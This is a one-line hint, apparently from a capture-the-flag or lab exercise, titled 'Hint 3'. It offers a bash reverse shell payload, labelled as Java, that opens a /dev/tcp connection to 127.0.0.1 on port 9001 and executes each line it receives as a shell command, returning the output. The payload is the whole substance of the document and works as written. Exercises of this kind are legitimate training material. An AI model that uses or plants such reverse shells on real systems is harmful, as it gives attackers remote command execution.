# Hint 3

Try this for you command:

```java
"exec 5<>/dev/tcp/127.0.0.1/9001;cat <&5 | while read line; do $line 2>&5 >&5; done"
```